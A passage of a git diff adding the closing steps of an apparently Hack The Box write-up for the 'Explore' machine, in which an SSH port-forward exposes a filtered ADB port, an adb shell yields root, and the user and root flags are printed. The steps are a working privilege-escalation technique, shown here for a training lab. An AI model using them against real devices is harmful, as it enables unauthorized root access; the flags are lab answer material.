@@ -227,4 +227,43 @@ Nmap done: 1 IP address (1 host up) scanned in 133.31 seconds
 f32017174c7c7e8f50c6da52891ae250
 ```
 
-20. 
+20. Remembering port 5555 is filtered before, that should be our interest. We can do port forwarding and access it with our local adb.
+
+> CHECKING WHETHER IT STILL LISTENING OR NOT.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/37765572-4079-43fd-8d31-8f3aad8fb29b)
+
+
+#### TODO:
+
+```
+Run ssh again but this time with port forwarding command.
+-> ssh -L 5555:127.0.0.1:5555 kristi@explore.htb -p 2222 -oHostKeyAlgorithms=+ssh-rsa
+
+connect our local adb tool with port 5555 at localhost.
+-> adb connect 127.0.0.1:5555
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0a04f5a4-4994-434f-91f7-05f58cefb3de)
+
+
+> RUN ADB SHELL -> `adb -s 127.0.0.1:5555 shell`
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9572167c-2ef8-4619-b9ed-64b31a19581e)
+
+
+21. We gained root!
+
+> GETTING ROOT FLAG --> located at `/data/root.txt`
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6b2a316b-5ae5-4d23-98a8-fa52a3eca407)
+
+
+## ROOT FLAG
+
+```
+f04fc82b6d49b41c9b08982be59338c5
+```
+
